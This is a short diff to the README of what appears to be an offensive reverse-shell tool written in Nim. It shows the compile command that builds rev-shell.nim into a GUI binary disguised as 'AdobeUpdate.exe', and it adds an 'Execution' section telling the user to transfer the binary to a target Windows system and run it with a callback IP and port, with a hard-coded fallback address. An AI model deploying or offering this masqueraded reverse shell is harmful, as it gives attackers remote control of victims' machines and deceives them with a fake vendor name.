@@ -27,6 +27,11 @@ nim c -d:mingw --app:gui --opt:speed -o:AdobeUpdate.exe rev-shell.nim
   -o: output
 ```
 
+### Execution
+Transfer to target Windows system
+```bash
+AdobeUpdate.exe 10.10.5.25 1337              --defaults to static IP in code if no arguments given
+```
 
 
 
